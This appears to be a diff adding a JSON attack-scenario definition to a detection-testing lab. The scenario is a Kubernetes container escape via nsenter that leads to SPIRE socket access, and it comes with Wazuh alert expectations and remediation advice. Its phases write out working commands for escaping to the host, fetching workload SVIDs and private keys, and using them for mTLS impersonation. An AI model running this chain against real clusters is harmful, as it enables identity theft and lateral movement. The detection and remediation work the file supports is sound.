@@ -1,0 +1,198 @@
+{
+  "id": "S7-07",
+  "name": "Container Escape to SPIRE Socket",
+  "category": "SPIFFE/SPIRE",
+  "version": "1.0",
+  "description": "Escape container isolation to access the host-level SPIRE Agent socket and harvest workload SVIDs — the canonical cross-domain attack chain combining container escape with SPIFFE identity theft",
+  "difficulty": "Expert",
+  "real_world_relevance": "This is the highest-impact SPIFFE/SPIRE attack scenario. In real Kubernetes deployments, the SPIRE Agent runs as a DaemonSet with the Workload API socket mounted into pods. A container escape (via privileged container, hostPID, or kernel exploit) grants access to the host-level socket, enabling the attacker to harvest SVIDs for every workload on the node. Demonstrated by Eviatar Gerzi as the 'Spooffe' attack chain.",
+
+  "mitre_attack": {
+    "tactics": ["Privilege Escalation", "Credential Access", "Lateral Movement"],
+    "techniques": [
+      {"id": "T1611", "name": "Escape to Host"},
+      {"id": "T1552.007", "name": "Unsecured Credentials: Container API"}
+    ]
+  },
+
+  "prerequisites": {
+    "containers": ["spire-server", "spire-agent", "k8s-node-1"],
+    "network": "k8s_net",
+    "profile": "k8s"
+  },
+
+  "attack_flow": {
+    "description": "Attacker escapes from a privileged container using nsenter to access the host PID namespace, locates the SPIRE Agent socket on the host filesystem, and harvests X.509 SVIDs for all workloads running on the same node",
+    "diagram": [
+      "1. From privileged container, use nsenter to enter host PID/mount namespaces",
+      "2. Discover SPIRE Agent socket on the host filesystem",
+      "3. Verify socket accessibility and identify the SPIRE Agent process",
+      "4. Connect to the Workload API socket and fetch X.509 SVIDs",
+      "5. Harvest certificates and private keys for all node-local workloads",
+      "6. Use stolen SVIDs to establish mTLS connections as impersonated workloads"
+    ]
+  },
+
+  "phases": [
+    {
+      "name": "Container Escape via nsenter",
+      "description": "Escape container isolation using nsenter to access host namespaces",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "nsenter --target 1 --mount --uts --ipc --net -- /bin/sh -c 'hostname && id && cat /proc/1/cgroup 2>/dev/null | head -5'",
+          "description": "Escape to host PID 1 namespace via nsenter — confirms host-level access"
+        }
+      ]
+    },
+    {
+      "name": "SPIRE Socket Discovery",
+      "description": "Locate the SPIRE Agent Workload API socket on the host filesystem",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "nsenter --target 1 --mount -- /bin/sh -c 'find / -maxdepth 5 -name \"*.sock\" 2>/dev/null | grep -i spire'",
+          "description": "Search host filesystem for SPIRE-related Unix sockets"
+        },
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "nsenter --target 1 --mount -- /bin/sh -c 'ls -la /opt/spire/sockets/ 2>/dev/null; ls -la /run/spire/sockets/ 2>/dev/null'",
+          "description": "Check common SPIRE socket locations and their permissions"
+        },
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "nsenter --target 1 --mount -- /bin/sh -c 'ps aux 2>/dev/null | grep spire-agent'",
+          "description": "Confirm SPIRE Agent process is running on the host"
+        }
+      ]
+    },
+    {
+      "name": "SVID Harvesting via Escaped Context",
+      "description": "Access the SPIRE Workload API from the escaped context to harvest SVIDs",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "nsenter --target 1 --mount -- /bin/sh -c '/opt/spire/bin/spire-agent api fetch x509 -socketPath /opt/spire/sockets/workload_api.sock -write /tmp/escaped-svids/ 2>&1'",
+          "description": "Fetch X.509 SVIDs from host-level SPIRE socket — returns all workload identities on this node"
+        },
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "nsenter --target 1 --mount -- /bin/sh -c 'ls -la /tmp/escaped-svids/ 2>/dev/null && for f in /tmp/escaped-svids/svid.*.pem; do openssl x509 -in \"$f\" -noout -subject 2>/dev/null; done'",
+          "description": "List harvested SVIDs and extract SPIFFE IDs from certificate subjects"
+        }
+      ]
+    },
+    {
+      "name": "Identity Impersonation",
+      "description": "Use harvested SVIDs to impersonate a workload via mTLS",
+      "actions": [
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "nsenter --target 1 --mount -- /bin/sh -c 'curl --cert /tmp/escaped-svids/svid.0.pem --key /tmp/escaped-svids/svid.0.key --cacert /tmp/escaped-svids/bundle.0.pem https://payment-service.internal:8443/api/transactions 2>/dev/null || echo \"mTLS impersonation attempted with stolen SVID\"'",
+          "description": "Attempt mTLS connection to internal service using stolen X.509 SVID"
+        }
+      ]
+    },
+    {
+      "name": "Detection Confirmation",
+      "description": "Verify detection rules fire for the escape-to-SVID chain",
+      "actions": [
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "python3 /opt/spire-monitor/spire_identity_monitor.py",
+          "description": "Run SPIRE identity monitor to detect SVID access from unexpected context"
+        }
+      ]
+    }
+  ],
+
+  "indicators_of_compromise": [
+    {
+      "type": "Auditd/Sysmon",
+      "description": "nsenter executed with namespace flags — container escape detected",
+      "wazuh_rule": "100757"
+    },
+    {
+      "type": "FIM/Auditd",
+      "description": "SPIRE Workload API socket accessed from non-standard process context",
+      "wazuh_rule": "101000"
+    },
+    {
+      "type": "Correlation",
+      "description": "Container escape followed by SPIRE socket access within 5 minutes — active attack chain",
+      "wazuh_rule": "101080"
+    }
+  ],
+
+  "expected_wazuh_alerts": [
+    {
+      "rule_id": "100757",
+      "level": 14,
+      "description": "NHI: Container escape via nsenter namespace entry"
+    },
+    {
+      "rule_id": "101000",
+      "level": 8,
+      "description": "NHI: SPIRE Workload API socket access detected"
+    },
+    {
+      "rule_id": "101080",
+      "level": 15,
+      "description": "NHI-SPIRE: Container escape chain leading to SVID theft - ACTIVE ATTACK"
+    }
+  ],
+
+  "remediation": {
+    "immediate": [
+      "Isolate the compromised node immediately — cordon and drain in Kubernetes",
+      "Revoke all SVIDs issued to workloads on the affected node",
+      "Force re-attestation of the SPIRE Agent on the node",
+      "Investigate how the container obtained privileged access (hostPID, privileged securityContext, CAP_SYS_ADMIN)"
+    ],
+    "long_term": [
+      "Enforce Pod Security Standards (Restricted profile) to prevent privileged containers and hostPID access",
+      "Use Kubernetes admission controllers (OPA Gatekeeper, Kyverno) to block nsenter, chroot, and mount namespace capabilities",
+      "Restrict SPIRE Agent socket permissions and use projected volumes instead of hostPath mounts",
+      "Deploy Falco or Tetragon for real-time container escape detection at the kernel level",
+      "Implement node attestation rotation — compromised nodes should fail re-attestation",
+      "Consider SPIRE Agent running in a hardened init container rather than as a DaemonSet with host access"
+    ]
+  },
+
+  "demo_script": {
+    "container": "k8s-node-1",
+    "commands": [
+      "scripts/talk/demo-5-container-escape-svid.sh"
+    ]
+  },
+
+  "references": [
+    {
+      "title": "The Machine with Many Faces — Eviatar Gerzi (CyberArk) - Spooffe Attack Chain",
+      "url": "https://nullcon.net/"
+    },
+    {
+      "title": "SPIFFE/SPIRE Threat Model - Node Compromise",
+      "url": "https://spiffe.io/docs/latest/spire/using/security/"
+    },
+    {
+      "title": "MITRE ATT&CK T1611 - Escape to Host",
+      "url": "https://attack.mitre.org/techniques/T1611/"
+    },
+    {
+      "title": "Kubernetes Pod Security Standards",
+      "url": "https://kubernetes.io/docs/concepts/security/pod-security-standards/"
+    }
+  ]
+}
